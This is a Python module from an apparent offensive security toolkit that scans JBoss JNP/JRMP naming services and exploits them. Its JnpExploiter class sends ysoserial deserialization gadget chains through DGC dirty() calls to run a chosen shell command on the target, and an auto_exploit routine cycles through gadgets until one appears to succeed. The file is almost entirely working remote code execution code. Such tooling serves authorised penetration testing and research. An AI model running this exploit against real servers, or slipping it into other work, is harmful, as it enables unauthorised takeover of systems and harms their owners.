"""JBoss JNP (Java Naming Protocol) scanner and exploiter.

JNP is JBoss AS 4.x–6.x's JNDI naming service.  The protocol works in two
phases:

1. **Bootstrap phase** (port 1099 / host:4444 in the lab):
   On connection the server immediately sends a serialised
   ``java.rmi.MarshalledObject`` containing a ``NamingServer_Stub``.  The stub
   includes a ``UnicastRef2`` block with the JRMP *transport* host:port
   (typically port 1098, or 4447 in the lab configuration).  The bootstrap
   phase is NOT standard JRMP — the server sends data before the client says
   anything.

2. **JRMP transport phase** (port 4447 in the lab):
   Standard JRMP endpoint used for actual naming operations (list, lookup) and
   DGC dirty() exploitation.

Detection strategy
------------------
1. Connect to the JNP port and send a JRMP handshake.
2. Read the server's response:
   - If it starts with ``0xAC 0xED`` (Java serialization magic): JNP bootstrap
     detected.  Extract the JRMP transport port from the embedded
     ``UnicastRef2`` block.
   - If it starts with ``0x4E`` (JRMP ProtocolAck): standard JRMP endpoint
     (use same port for DGC and registry operations).
3. Connect to ``target_host:jrmp_transport_port`` and issue a Registry
   ``list()`` call to enumerate JNDI bindings.
4. Classify as JNP if bound names match known JBoss JNDI patterns.

Exploitation
------------
DGC dirty() is delivered to the JRMP transport port (step 3 above).  JBoss
4.x–6.x does not apply JEP 290 deserialization filters, so any ysoserial
gadget chain present in the classpath will execute.
"""

from __future__ import annotations

import struct
from dataclasses import dataclass, field
from typing import Any

from javapwner.core.jvm_exploit import JvmExploit
from javapwner.core.payload import YsoserialWrapper
from javapwner.core.serialization import detect_exception_in_stream
from javapwner.core.socket_helper import TCPSession
from javapwner.exceptions import ConnectionError as JPConnectionError
from javapwner.protocols.rmi.protocol import (
    DGC_OBJID,
    MSG_CALL,
    MSG_RETURN,
    RETURN_EXCEPTION,
    PROTOCOL_ACK,
    JAVA_STREAM_MAGIC,
    JAVA_STREAM_VERSION,
    build_jrmp_handshake,
    build_client_endpoint,
    build_list_call,
    parse_jrmp_ack,
    parse_registry_return,
)

_RECV_TIMEOUT = 4.0
_DGC_OP_INDEX = struct.pack(">i", 1)

# Preferred gadget probe order — same priority as RMI/Jini auto modes.
_PROBE_PRIORITY: tuple[str, ...] = (
    "CommonsCollections6",
    "CommonsCollections5",
    "CommonsCollections7",
    "CommonsCollections1",
    "CommonsCollections2",
    "CommonsCollections3",
    "CommonsCollections4",
    "CommonsBeanutils1",
    "Spring1",
    "Spring2",
    "Groovy1",
    "ROME",
    "BeanShell1",
    "Clojure",
    "Jython1",
    "MozillaRhino1",
    "MozillaRhino2",
)
_NON_EXEC_GADGETS: frozenset[str] = frozenset({"URLDNS", "JRMPClient"})

# DGC interface hash — 0xF6B6898D8BF28643 = -669196253586618813 signed
_DGC_INTERFACE_HASH = struct.pack(">q", -669196253586618813)

# Java ObjectOutputStream header
_OOS_HEADER = JAVA_STREAM_MAGIC + JAVA_STREAM_VERSION

# Strings in bound names that indicate a JBoss JNDI tree
_JBOSS_JNDI_KEYWORDS = (
    "java:/", "jboss/", "jms/", "ejb/", "mail/", "XAConnectionFactory",
    "ConnectionFactory", "queue/", "topic/", "jmx/", "datasource",
    "JNDIView", "jndi",
)


def _likely_success_from_jvm(jvm: dict) -> bool:
    """Compute likely_success from a JvmExploit.run_dgc() result."""
    if not jvm.get("sent", False) or jvm.get("error"):
        return False
    resp_hex = jvm.get("response_hex", "")
    try:
        resp_bytes = bytes.fromhex(resp_hex)
    except ValueError:
        resp_bytes = b""
    if b"java.rmi.ServerError" in resp_bytes:
        return False
    if b"java.rmi.ServerException" in resp_bytes:
        return True
    return jvm.get("response_len", 0) > 0


def _extract_jrmp_port(bootstrap: bytes) -> int | None:
    """Extract the JRMP transport port from a JNP bootstrap MarshalledObject.

    The JNP bootstrap is a serialised ``java.rmi.MarshalledObject`` whose
    ``objBytes`` field contains a ``NamingServer_Stub`` (a RemoteObject
    sub-class).  The stub's ref is serialised as a ``TC_BLOCKDATA`` block
    whose content starts with ``writeUTF("UnicastRef2")`` followed (possibly
    after 1–4 implementation-specific pad bytes) by ``writeUTF(host)`` and
    ``writeInt(port)``.

    Scans offsets 0..4 past the typestring to cope with pad bytes written by
    different JDK / JBoss versions (e.g. JBoss 4.2.3.GA writes one extra
    ``writeBoolean(false)`` byte before the host).

    Returns the port integer, or ``None`` if no valid host+port block is found.
    """
    marker = b"\x00\x0bUnicastRef2"  # writeUTF length (11) + "UnicastRef2"
    idx = bootstrap.find(marker)
    if idx < 0:
        return None
    base = idx + len(marker)

    for extra in range(5):  # try 0 .. 4 pad bytes
        pos = base + extra
        if pos + 2 > len(bootstrap):
            break
        host_len = int.from_bytes(bootstrap[pos:pos + 2], "big")
        if host_len == 0 or host_len > 255:
            continue
        pos += 2
        if pos + host_len + 4 > len(bootstrap):
            continue
        try:
            bootstrap[pos:pos + host_len].decode("ascii")
        except UnicodeDecodeError:
            continue
        port = int.from_bytes(bootstrap[pos + host_len:pos + host_len + 4], "big")
        if 1 <= port <= 65535:
            return port

    return None


def _build_dgc_dirty_call(payload_bytes: bytes) -> bytes:
    """Build a JRMP DGC dirty() call with the corrected wire format.

    Wire format (proven by real JDK capture):
      MSG_CALL (1 byte)
      AC ED 00 05          ObjectOutputStream header
      77 22                TC_BLOCKDATA, 34 bytes
      DGC_OBJID (22 bytes) inside block data
      op=1 (4 bytes)       inside block data   ← dirty()
      hash (8 bytes)       inside block data   ← DGC interface hash
      [object bytes]       raw TC_OBJECT content (OOS header stripped)
    """
    block_data = DGC_OBJID + _DGC_OP_INDEX + _DGC_INTERFACE_HASH  # 34 bytes
    # Strip OOS header (AC ED 00 05) from ysoserial output — the server's
    # MarshalInputStream expects raw object content, not a new OOS stream.
    obj_bytes = payload_bytes[4:] if payload_bytes[:2] == b"\xac\xed" else payload_bytes
    return (
        bytes([MSG_CALL])
        + _OOS_HEADER
        + bytes([0x77, len(block_data)])   # TC_BLOCKDATA, length=34
        + block_data
        + obj_bytes
    )


@dataclass
class JnpScanResult:
    """Result of scanning a JNP endpoint."""
    host: str
    port: int
    is_open: bool = False
    is_jrmp: bool = False
    is_jnp: bool = False
    bound_names: list[str] = field(default_factory=list)
    error: str | None = None

    def to_dict(self) -> dict[str, Any]:
        return {
            "host": self.host,
            "port": self.port,
            "is_open": self.is_open,
            "is_jrmp": self.is_jrmp,
            "is_jnp": self.is_jnp,
            "bound_names": self.bound_names,
            "error": self.error,
        }


@dataclass
class JnpExploitResult:
    """Result of a JNP exploit attempt."""
    sent: bool = False
    likely_success: bool = False
    response_bytes: bytes = field(default=b"", repr=False)
    error: str | None = None
    gadget_used: str | None = None   # set by auto_exploit()

    def to_dict(self) -> dict[str, Any]:
        return {
            "sent": self.sent,
            "likely_success": self.likely_success,
            "error": self.error,
            "gadget_used": self.gadget_used,
        }


class JnpScanner:
    """Detect and enumerate a JBoss JNP service.

    Handles both the JNP bootstrap protocol (server sends serialised
    MarshalledObject on connection) and plain JRMP endpoints.

    Parameters
    ----------
    timeout:
        Network timeout in seconds.
    """

    DEFAULT_PORT = 4444

    def __init__(self, timeout: float = 5.0):
        self.timeout = timeout

    def scan(self, host: str, port: int) -> JnpScanResult:
        """Probe *host:port* for a JNP service.

        Phase 1: Send a JRMP handshake and read the server's response.
        - If response starts with 0xAC 0xED (Java serialisation) → JNP bootstrap
          detected; extract the embedded JRMP transport port.
        - If response starts with 0x4E (ProtocolAck) → standard JRMP; use the
          same port for registry list().

        Phase 2: Issue a Registry ``list()`` call on the JRMP transport port to
        enumerate bound JNDI names.
        """
        result = JnpScanResult(host=host, port=port)

        # ── Phase 1: detect service and find JRMP transport port ──────────────
        jrmp_port = self._detect_service(host, port, result)
        if jrmp_port is None:
            return result

        # ── Phase 2: Registry list() on the JRMP transport port ───────────────
        try:
            with TCPSession(host, jrmp_port, timeout=self.timeout) as sess:
                sess.send(build_jrmp_handshake())
                ack = sess.recv(512, exact=False)
                if not ack:
                    return result
                try:
                    parse_jrmp_ack(ack)
                except ValueError:
                    return result

                sess.send(build_client_endpoint())
                sess.send(build_list_call())
                raw = sess.recv_all(timeout=_RECV_TIMEOUT)
                if not raw:
                    return result

                parsed = parse_registry_return(raw)
                names = parsed.get("names", [])
                result.bound_names = names

                # Classify as JNP if not already set by bootstrap detection
                if not result.is_jnp:
                    if names:
                        jndi_lower = [n.lower() for n in names]
                        result.is_jnp = any(
                            any(kw.lower() in n for kw in _JBOSS_JNDI_KEYWORDS)
                            for n in jndi_lower
                        )
                        if not result.is_jnp:
                            # Fallback: any non-empty registry on default JNP port
                            result.is_jnp = (port == self.DEFAULT_PORT)
                    else:
                        # Empty registry — mark as JNP if JRMP confirmed on 4444
                        result.is_jnp = result.is_jrmp and (port == self.DEFAULT_PORT)

        except JPConnectionError:
            pass

        return result

    def _detect_service(
        self, host: str, port: int, result: JnpScanResult
    ) -> int | None:
        """Connect to host:port, send JRMP handshake, read response.

        Returns the JRMP transport port to use for subsequent operations, or
        ``None`` on error (sets ``result.error`` accordingly).
        """
        try:
            with TCPSession(host, port, timeout=self.timeout) as sess:
                sess.send(build_jrmp_handshake())
                ack_data = sess.recv(512, exact=False)
                if not ack_data:
                    result.error = "No response to JRMP handshake"
                    return None
                result.is_open = True

                if ack_data[0] == PROTOCOL_ACK:
                    # Standard JRMP endpoint
                    try:
                        parse_jrmp_ack(ack_data)
                    except ValueError as exc:
                        result.error = str(exc)
                        return None
                    result.is_jrmp = True
                    return port

                if ack_data[:2] == b"\xac\xed":
                    # JNP bootstrap — server sent MarshalledObject immediately.
                    # TCP may deliver the bootstrap in multiple segments; read
                    # the rest with a short timeout to reassemble it.
                    try:
                        more = sess.recv_all(timeout=1.0)
                        if more:
                            ack_data += more
                    except Exception:
                        pass
                    result.is_jnp = True
                    jrmp_port = _extract_jrmp_port(ack_data)
                    if jrmp_port is None:
                        result.error = (
                            "JNP bootstrap received but UnicastRef2 port not found"
                        )
                        return None
                    return jrmp_port

                result.error = f"Unexpected response: 0x{ack_data[0]:02x}"
                return None

        except JPConnectionError as exc:
            result.error = str(exc)
            return None


class JnpExploiter:
    """Deliver a ysoserial payload via JBoss JNP using DGC dirty().

    Handles both standard JRMP endpoints and JNP bootstrap ports (auto-
    detects which is which and uses the correct JRMP transport port).

    Parameters
    ----------
    timeout:
        Network timeout in seconds.
    jar_path:
        Path to ysoserial JAR (uses YSOSERIAL_PATH env var if ``None``).
    """

    def __init__(self, timeout: float = 5.0, jar_path: str | None = None):
        self.timeout = timeout
        self._ysoserial = YsoserialWrapper(jar_path=jar_path)
        # JvmExploit uses a custom DgcMarshalOutputStream that writes TC_NULL
        # class annotations, which is required for MarshalInputStream.resolveClass()
        # to succeed.  Plain ysoserial ObjectOutputStream writes TC_ENDBLOCKDATA
        # instead, causing OptionalDataException on the server side.
        try:
            self._jvm_exploit: JvmExploit | None = JvmExploit(
                jar_path=str(self._ysoserial._jar),
                timeout=timeout,
            )
        except Exception:
            self._jvm_exploit = None

    def exploit(
        self, host: str, port: int, payload_bytes: bytes
    ) -> JnpExploitResult:
        """Send *payload_bytes* to the JNP/JRMP endpoint via DGC dirty().

        Connects to *host:port*, detects whether it is a JNP bootstrap port
        or a plain JRMP endpoint, extracts the JRMP transport port, and
        delivers the DGC dirty() call with the corrected wire format.
        """
        result = JnpExploitResult()

        # Step 1: Detect service type and get JRMP transport port
        jrmp_port = self._detect_jrmp_port(host, port, result)
        if jrmp_port is None:
            return result

        # Step 2: DGC dirty() on the JRMP transport port
        return self._send_dgc_payload(host, jrmp_port, payload_bytes, result)

    def exploit_gadget(
        self, host: str, port: int, gadget: str, command: str
    ) -> JnpExploitResult:
        """Deliver *gadget*/*command* via JBoss JNP DGC dirty().

        Uses JvmExploit (custom ``DgcMarshalOutputStream``) when available so
        that class annotations are written as ``TC_NULL`` — required for
        ``MarshalInputStream.resolveClass()`` to succeed on the server.
        Falls back to the Python path (ysoserial raw bytes) when JvmExploit
        is unavailable.
        """
        result = JnpExploitResult()

        # Phase 1: detect JRMP transport port
        jrmp_port = self._detect_jrmp_port(host, port, result)
        if jrmp_port is None:
            return result

        # Phase 2: deliver via JvmExploit (preferred) or Python path
        if self._jvm_exploit is not None:
            jvm = self._jvm_exploit.run_dgc(host, jrmp_port, gadget, command)
            result.sent = jvm.get("sent", False)
            result.error = jvm.get("error")
            resp_hex = jvm.get("response_hex", "")
            result.response_bytes = bytes.fromhex(resp_hex) if resp_hex else b""
            result.likely_success = _likely_success_from_jvm(jvm)
            return result

        # JvmExploit not available — fall back to raw ysoserial bytes
        try:
            payload = self._ysoserial.generate(gadget, command)
        except Exception as exc:  # noqa: BLE001
            result.error = str(exc)
            return result
        return self._send_dgc_payload(host, jrmp_port, payload, result)

    def _send_dgc_payload(
        self,
        host: str,
        jrmp_port: int,
        payload_bytes: bytes,
        result: JnpExploitResult,
    ) -> JnpExploitResult:
        """Send a pre-built DGC dirty() call to *host:jrmp_port*."""
        dgc_call = _build_dgc_dirty_call(payload_bytes)
        try:
            with TCPSession(host, jrmp_port, timeout=self.timeout) as sess:
                sess.send(build_jrmp_handshake())
                ack_data = sess.recv(512, exact=False)
                if not ack_data:
                    result.error = "No JRMP handshake response"
                    return result
                try:
                    parse_jrmp_ack(ack_data)
                except ValueError as exc:
                    result.error = str(exc)
                    return result

                sess.send(build_client_endpoint())
                sess.send(dgc_call)
                result.sent = True

                try:
                    response = sess.recv_all(timeout=_RECV_TIMEOUT)
                    result.response_bytes = response
                    if b"java.rmi.ServerError" in response:
                        result.likely_success = False
                    elif b"java.rmi.ServerException" in response:
                        result.likely_success = True
                    elif detect_exception_in_stream(response):
                        result.likely_success = False
                    elif response and len(response) >= 2 and response[0] == MSG_RETURN and response[1] != RETURN_EXCEPTION:
                        result.likely_success = True
                except Exception:
                    result.likely_success = True  # blind execution

        except JPConnectionError as exc:
            if result.sent:
                result.likely_success = True
            else:
                result.error = str(exc)

        return result

    def _detect_jrmp_port(
        self, host: str, port: int, result: JnpExploitResult
    ) -> int | None:
        """Probe host:port and return the JRMP transport port for DGC operations."""
        try:
            with TCPSession(host, port, timeout=self.timeout) as sess:
                sess.send(build_jrmp_handshake())
                ack_data = sess.recv(512, exact=False)
                if not ack_data:
                    result.error = "No response to JRMP handshake"
                    return None

                if ack_data[0] == PROTOCOL_ACK:
                    # Standard JRMP — use same port for DGC
                    try:
                        parse_jrmp_ack(ack_data)
                    except ValueError as exc:
                        result.error = str(exc)
                        return None
                    return port

                if ack_data[:2] == b"\xac\xed":
                    # JNP bootstrap — reassemble then extract embedded JRMP port
                    try:
                        more = sess.recv_all(timeout=1.0)
                        if more:
                            ack_data += more
                    except Exception:
                        pass
                    jrmp_port = _extract_jrmp_port(ack_data)
                    if jrmp_port is None:
                        result.error = (
                            "JNP bootstrap received but UnicastRef2 port not found"
                        )
                        return None
                    return jrmp_port

                result.error = f"Unexpected response: 0x{ack_data[0]:02x}"
                return None

        except JPConnectionError as exc:
            result.error = str(exc)
            return None

    def auto_exploit(
        self,
        host: str,
        port: int,
        command: str,
        jar_path: str | None = None,
    ) -> tuple[str | None, JnpExploitResult]:
        """Try gadgets in priority order and stop on first likely_success.

        Parameters
        ----------
        host, port:
            Target JNP endpoint.
        command:
            Shell command to execute on the target.
        jar_path:
            Path to ysoserial JAR (uses YSOSERIAL_PATH env var if ``None``).

        Returns
        -------
        tuple[str | None, JnpExploitResult]
            ``(gadget_used, result)`` — ``gadget_used`` is ``None`` if no
            gadget succeeded.
        """
        wrapper = self._ysoserial
        try:
            available = set(wrapper.list_gadgets())
        except Exception:  # noqa: BLE001
            empty = JnpExploitResult(error="ysoserial unavailable")
            return None, empty

        to_try: list[str] = [
            g for g in _PROBE_PRIORITY if g in available and g not in _NON_EXEC_GADGETS
        ]
        to_try += sorted(available - set(to_try) - _NON_EXEC_GADGETS)

        for gadget in to_try:
            result = self.exploit_gadget(host, port, gadget, command)
            if result.likely_success:
                result.gadget_used = gadget
                return gadget, result

        last = JnpExploitResult(error="No gadget produced a likely_success response")
        return None, last
